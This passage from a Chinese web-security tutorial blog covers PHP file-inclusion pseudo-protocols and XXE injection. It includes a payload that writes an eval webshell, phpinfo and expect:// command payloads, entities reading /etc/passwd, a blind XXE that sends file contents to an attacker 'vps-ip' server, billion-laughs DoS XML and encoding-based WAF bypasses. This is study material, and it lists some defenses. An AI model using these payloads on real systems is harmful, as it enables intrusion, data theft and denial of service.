class="line">?&gt;</span><br></pre></td></tr></table></figure><p>测试结果：</p><p><img src="image-20210425231940338.png" alt="image-20210425231940338"></p><h5 id="2-php-input（写入木马）"><a href="#2-php-input（写入木马）" class="headerlink" title="2.php:&#x2F;&#x2F;input（写入木马）"></a>2.php:&#x2F;&#x2F;input（写入木马）</h5><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。</p><p>如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20210425232016258.png" alt="image-20210425232016258"></p><p>如果不开启allow_url_include会报错：</p><p><img src="image-20210425232034218.png" alt="image-20210425232034218"></p><h5 id="3-php-input（命令执行）"><a href="#3-php-input（命令执行）" class="headerlink" title="3.php:&#x2F;&#x2F;input（命令执行）"></a>3.php:&#x2F;&#x2F;input（命令执行）</h5><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p><p><img src="image-20210425232057832.png" alt="image-20210425232057832"></p><p>如果不开启allow_url_include会报错：</p><p><img src="image-20210425232113563.png" alt="image-20210425232113563"></p><h4 id="zip-—-压缩流"><a href="#zip-—-压缩流" class="headerlink" title="zip:&#x2F;&#x2F; — 压缩流"></a><a href="https://www.php.net/manual/zh/wrappers.compression.php">zip:&#x2F;&#x2F;</a> — 压缩流</h4><p>allow_url_fopen ：off&#x2F;on 、allow_url_include：off&#x2F;on</p><p>zip伪协议和phar协议类似，但是用法不一样。</p><p>用法：?file&#x3D;zip:&#x2F;&#x2F;[压缩文件绝对路径]#[压缩文件内的子文件名] zip:&#x2F;&#x2F;xxx.png#shell.php。</p><p>条件： PHP &gt; &#x3D;5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p><h4 id="data-—-数据（RFC-2397）"><a href="#data-—-数据（RFC-2397）" class="headerlink" title="data:&#x2F;&#x2F; — 数据（RFC 2397）"></a><a href="https://www.php.net/manual/zh/wrappers.data.php">data:&#x2F;&#x2F;</a> — 数据（RFC 2397）</h4><p>allow_url 两个都需要 On (没用，都为on我直接就去php:&#x2F;&#x2F;input getshell了)</p><p>和php伪协议的input类似，碰到file_get_contents()来用；</p><p>如果php.ini里的allow_url_include&#x3D;On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码</p><p>例子：data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg （phpinfo)(另外data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg （phpinfo))</p><p><img src="image-20210425232346381.png" alt="image-20210425232346381"></p><p>也可：data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?></p><p>或者data:text&#x2F;plain,<?php phpinfo()?></p><h4 id="glob-—-查找匹配的文件路径模式"><a href="#glob-—-查找匹配的文件路径模式" class="headerlink" title="glob:&#x2F;&#x2F; — 查找匹配的文件路径模式"></a><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob:&#x2F;&#x2F;</a> — 查找匹配的文件路径模式</h4><h4 id="phar-—-PHP-归档"><a href="#phar-—-PHP-归档" class="headerlink" title="phar:&#x2F;&#x2F; — PHP 归档"></a><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar:&#x2F;&#x2F;</a> — PHP 归档</h4><p>allow 两个都为ON 并且PHP版本高于5.3<br>例子：<a href="http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg">http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg</a> 和zip伪协议是一样的用法<br>生成phar打包代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$p = new PharData(dirname(__FILE__).&#x27;/phartest2.zip&#x27;, 0,&#x27;phartest2&#x27;,Phar::ZIP) ;</span><br><span class="line">$x=file_get_contents(&#x27;./php.php&#x27;);</span><br><span class="line">$p-&gt;addFromString(&#x27;a.jpg&#x27;,$x);</span><br><span class="line">//会生成一个zip的压缩文件phartest2.zip 其中压缩了一个a.jpg a.jpg里面代码是php.php的内容</span><br><span class="line">//当然和zip协议一样，你也可以把phartest2.zip改成任意后缀，这里的后缀和包含读取是没有关系的。怎么绕过白名单方便就怎么来</span><br><span class="line">//然后我们构造http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg</span><br><span class="line">//也可以直接shell</span><br><span class="line">//其中phar适用范围为php&gt;=5.3.0</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="ssh2-—-Secure-Shell-2"><a href="#ssh2-—-Secure-Shell-2" class="headerlink" title="ssh2:&#x2F;&#x2F; — Secure Shell 2"></a><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2:&#x2F;&#x2F;</a> — Secure Shell 2</h4><h4 id="rar-—-RAR"><a href="#rar-—-RAR" class="headerlink" title="rar:&#x2F;&#x2F; — RAR"></a><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar:&#x2F;&#x2F;</a> — RAR</h4><h4 id="ogg-—-音频流"><a href="#ogg-—-音频流" class="headerlink" title="ogg:&#x2F;&#x2F; — 音频流"></a><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg:&#x2F;&#x2F;</a> — 音频流</h4><h4 id="expect-—-处理交互式的流"><a href="#expect-—-处理交互式的流" class="headerlink" title="expect:&#x2F;&#x2F; — 处理交互式的流"></a><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect:&#x2F;&#x2F;</a> — 处理交互式的流</h4><h2 id="3-防御姿势"><a href="#3-防御姿势" class="headerlink" title="3.防御姿势"></a>3.防御姿势</h2><p>1.设置白名单</p><p>2.过滤危险字符</p><p>3.设置目录文件：open_basedir</p><p>4.关闭allow_url_include（默认关闭）</p><p>5.WAF产品</p><p><strong>参考</strong></p><p><a href="https://www.secpulse.com/archives/153767.html">https://www.secpulse.com/archives/153767.html</a></p><p><a href="https://www.cnblogs.com/littlehann/p/3665062.html#_lab2_4_0">https://www.cnblogs.com/littlehann/p/3665062.html#_lab2_4_0</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2020/06/11/xxe&amp;xml/"/>
      <url>/2020/06/11/xxe&amp;xml/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="1-xml"><a href="#1-xml" class="headerlink" title="1.xml"></a>1.xml</h3><p>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p><p><strong>XML和HTML的主要差异</strong></p><blockquote><p>XML被设计为传输和存储数据，其焦点是数据的内容。</p><p>HTML被设计用来显示数据，其焦点是数据的外观。</p><p>HTML旨在显示信息，而XML旨在传输信息。</p></blockquote><p>典型的xml文档</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTD，文档类型定义，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-DTD概念及声明"><a href="#1-DTD概念及声明" class="headerlink" title="1.DTD概念及声明"></a>1.DTD概念及声明</h4><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。</p><p>DTD一般认为有两种引用或声明方式：</p><ul><li>1、内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。</li><li>2、外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。</li></ul><p>DTD实体有以下几种声明方式</p><h5 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h5><p> <code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY a <span class="string">&quot;admin&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- admin --&gt;</span></span><br></pre></td></tr></table></figure><h5 id="内部参数实体"><a href="#内部参数实体" class="headerlink" title="内部参数实体"></a>内部参数实体</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>&gt;</span> [</span><br><span class="line">    <span class="meta">&lt;!ENTITY % b <span class="string">&quot;&lt;!ENTITY b1 &quot;</span>awsl<span class="string">&quot;&gt;&quot;</span>&gt;</span></span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>&amp;b1;<span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- awsl --&gt;</span></span><br></pre></td></tr></table></figure><ul><li>参数实体用<code>% name</code>申明，引用时用<code>%name;</code>，只能在DTD中申明，DTD中引用。</li><li>其余实体直接用<code>name</code>申明，引用时用<code>&amp;name;</code>，只能在DTD中申明，可在xml文档中引用</li></ul><h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h5><p><code>&lt;!DOCTYPE 根元素名称 SYSTEM &quot;外部DTD的URI&quot;&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note&gt; [</span><br><span class="line">    &lt;!ENTITY c SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;c;&lt;/note&gt;</span><br><span class="line">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span><br></pre></td></tr></table></figure><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p><p><img src="image-20210803231452871.png" alt="image-20210803231452871"></p><p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p><p><img src="image-20210803231523389.png" alt="image-20210803231523389"></p><h5 id="外部参数实体"><a href="#外部参数实体" class="headerlink" title="外部参数实体"></a>外部参数实体</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note&gt; [</span><br><span class="line">    &lt;!ENTITY % d SYSTEM &quot;http://vps-ip/xml.dtd&quot;&gt;</span><br><span class="line">    %d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;d1&lt;/note&gt;</span><br><span class="line">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span><br></pre></td></tr></table></figure><p><code>http://vps-ip/xml.dtd</code>内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- http://vps-ip/xml.dtd --&gt;</span><br><span class="line">&lt;!ENTITY d1 SYSTEM &quot;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==&quot;&gt;</span><br></pre></td></tr></table></figure><h5 id="公共实体"><a href="#公共实体" class="headerlink" title="公共实体"></a>公共实体</h5><p><code>&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</code></p><h3 id="2-XXE"><a href="#2-XXE" class="headerlink" title="2.XXE"></a>2.XXE</h3><p>XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><p>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。</p><h4 id="1-有回显"><a href="#1-有回显" class="headerlink" title="1.有回显"></a>1.有回显</h4><h5 id="1-引入外部实体"><a href="#1-引入外部实体" class="headerlink" title="1.引入外部实体"></a>1.引入外部实体</h5><p><strong>读文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d://test.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">xx</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>用于探测ip的端口是否开放、文件是否存在</strong></p><p>这点类似SSRF</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip:port/test.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>RCE</strong></p><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当&#x2F;开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：</p><p>expect为payload，id为要执行的命令，由于要expect扩展，所以实战很少碰到</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">xx</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-引入外部参数实体"><a href="#2-引入外部参数实体" class="headerlink" title="2..引入外部参数实体"></a>2..引入外部参数实体</h5><p>相当于远程包含.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps-ip/hack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#hack.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-无回显"><a href="#2-无回显" class="headerlink" title="2.无回显"></a>2.无回显</h4><p>可以使用外带数据通道提取数据，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到攻击服务器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line"></span><br><span class="line">#此时目标先访问本地的d:/test.txt文件，base64编码再赋值给$file</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&gt;</span><br><span class="line">#本地机器访问vps的test.dtd文件</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip/text.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>dtd文件为访问本地服务器的路径，此时有两种方法，一是构造一个接收文件，二是直接如图所示，其结果将会记录在本地apache访问日志记录里面）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">#evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://vps-ip/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="image-20210804235614130.png" alt="image-20210804235614130"></p><h4 id="DOS攻击（没复现过。。。）"><a href="#DOS攻击（没复现过。。。）" class="headerlink" title="DOS攻击（没复现过。。。）"></a>DOS攻击（没复现过。。。）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用<code>/dev/random</code>文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h3 id="3-绕过"><a href="#3-绕过" class="headerlink" title="3.绕过"></a>3.绕过</h3><h4 id="1-空格"><a href="#1-空格" class="headerlink" title="1.空格"></a>1.空格</h4><p>由于XXE通常在XML文档的开头，some WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在<code>&lt;?xml?&gt;</code>或<code>&lt;!DOCTYPE&gt;</code>中插入成千上万的空格，从而绕过此类WAF。</p><h4 id="2-编码"><a href="#2-编码" class="headerlink" title="2.编码"></a>2.编码</h4><p><code>ENTITY、SYSTEM、file</code>等关键词被过滤，由于一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。</p><p>使用编码方式绕过：UTF-16BE<br><code>cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</code></p><h4 id="在一个文档中使用两种类型的编码"><a href="#在一个文档中使用两种类型的编码" class="headerlink" title="在一个文档中使用两种类型的编码"></a><strong>在一个文档中使用两种类型的编码</strong></h4><p><a href="https://xz.aliyun.com/t/4059">https://xz.aliyun.com/t/4059</a></p><h4 id="3-大小写"><a href="#3-大小写" class="headerlink" title="3.大小写"></a>3.大小写</h4><p>利用正则匹配的不严格，大小写关键字绕过</p><h4 id="4-链接到未知实体"><a href="#4-链接到未知实体" class="headerlink" title="4.链接到未知实体"></a>4.链接到未知实体</h4><p>比较成熟的WAF设置通常不会读取链接文件的内容。这种策略通常是有意义的，否则，WAF本身也可能成为攻击的目标。问题是，外部资源的链接不仅可以存在于文档的第三部分（正文），还可以存在于声明&lt;! DOCTYPE&gt;中 